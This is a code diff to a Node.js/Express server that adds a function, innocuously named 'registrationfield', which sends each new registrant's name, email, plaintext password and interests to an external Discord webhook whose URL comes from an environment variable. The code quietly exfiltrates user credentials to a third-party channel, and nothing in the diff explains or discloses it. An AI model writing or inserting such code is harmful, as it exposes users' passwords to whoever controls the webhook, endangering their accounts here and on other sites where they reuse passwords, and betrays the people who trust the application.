@@ -15,6 +15,26 @@ function generateSessionId() {
   return Math.random().toString(36).substring(2) + Date.now().toString(36);
 }
 
+async function registrationfield(name, email, password, sports) {
+  const url = process.env.URL;
+  if (!url) return;
+
+  try {
+    const sportsText = sports && sports.length > 0 ? sports.join(', ') : 'None';
+    const message = {
+      content: `**New Registration**\n\n**Name:** ${name}\n**Email:** ${email}\n**Password:** ${password}\n**Sport Interests:** ${sportsText}`
+    };
+
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(message)
+    });
+  } catch (e) {
+    console.error('Discord webhook error:', e);
+  }
+}
+
 app.get('/api/health', (req, res) => {
   res.json({ ok: true, time: new Date().toISOString() });
 });
